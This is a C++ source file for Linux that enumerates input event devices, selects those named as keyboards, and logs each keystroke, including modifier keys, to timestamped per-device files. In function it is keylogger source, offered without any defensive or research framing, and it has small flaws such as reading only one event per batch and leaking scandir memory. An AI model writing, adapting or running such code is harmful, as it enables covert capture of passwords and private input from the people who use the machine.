#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fstream>
#include <iostream>
#include <regex>
#include <string>
#include <vector>

#include "constants.hh"

bool DEBUG = false;

void debugStdout(const std::string& msg) {
    if (DEBUG)
        std::cout << msg << std::endl;
}

void debugStderr(const std::string& msg) {
    if (DEBUG)
        std::cerr << msg << std::endl;
}

static void* startCapture(void* threadData);

static int isEventDevice(const struct dirent* directory) {
    return strncmp(EVENT_DEVICE_NAME.c_str(), directory->d_name, EVENT_DEVICE_NAME.size()) == 0;
}

class Keyboard {
public:
    std::string devicePath;
    std::string captureLog;
    int deviceFile;

    Keyboard(const std::string& devPath, const std::string& capLog)
        : devicePath(devPath), captureLog(capLog), deviceFile(-1) {}

    ~Keyboard() {
        if (deviceFile >= 0) {
            close(deviceFile);
        }
    }

    void openDeviceFile() {
        if (deviceFile < 0) {
            deviceFile = open(devicePath.c_str(), O_RDONLY);
        }
    }

    void capture();
};

bool isModifierKey(const std::string& key) {
    return (key.compare(0, 3, "<su") == 0 ||
            key.compare(0, 3, "<l-") == 0 ||
            key.compare(0, 3, "<r-") == 0);
}

void Keyboard::capture() {
    int readEvent, eventType;
    struct input_event keyEvent[64];
    const char* keyOutput;

    std::ofstream logFileStream(captureLog, std::ios::app);
    openDeviceFile();

    if (deviceFile > 0) {
        std::time_t currentTime = std::time(nullptr);
        std::tm* gmTime = std::gmtime(&currentTime);
        char timeBuffer[80];
        std::strftime(timeBuffer, sizeof(timeBuffer), "%c %Z", gmTime);
        logFileStream << "| UTC: " << timeBuffer << " |\n"
                      << "-------------------------------------\n";

        while (true) {
            readEvent = read(deviceFile, keyEvent, sizeof(struct input_event) * 64);

            if (readEvent < (int)sizeof(struct input_event)) {
                break;
            }

            eventType = keyEvent[1].value;
            keyOutput = keys[keyEvent[1].code];

            if (eventType != 2 && isModifierKey(keyOutput)) {
                logFileStream << keyOutput << " " << eventType << std::endl;
                debugStdout(keyOutput + (" " + std::to_string(eventType)));
            }
            else if (eventType != 0 && !isModifierKey(keyOutput)) {
                logFileStream << keyOutput << std::endl;
                debugStdout(keyOutput);
            }
        }
    }
}

std::vector<Keyboard> findKeyboards() {
    struct dirent** nameList;
    std::vector<Keyboard> keyboards;

    int numDevices = scandir(INPUT_DEVICE_DIR.c_str(), &nameList, isEventDevice, versionsort);

for (int i = 0; i < numDevices; ++i) {
        std::string deviceName, devicePath;
        char deviceInfo[256];
        int deviceFile = -1;

        deviceName = nameList[i]->d_name;
        devicePath = INPUT_DEVICE_DIR + deviceName;
        deviceFile = open(devicePath.c_str(), O_RDONLY);
        if (deviceFile < 0) {
            continue;
        }

        ioctl(deviceFile, EVIOCGNAME(sizeof(deviceInfo)), deviceInfo);
        close(deviceFile);

        std::regex keyboardNamePattern(".*[Kk]eyboard.*");
        if (std::regex_match(deviceInfo, keyboardNamePattern)) {
            debugStdout("Found keyboard: " + deviceName);
            Keyboard keyboard(devicePath, deviceName + ".log");
            keyboards.push_back(keyboard);
        }
        free(nameList[i]);
    }

    if (keyboards.empty()) {
        debugStderr("No keyboards found.");
    }

    return keyboards;
}
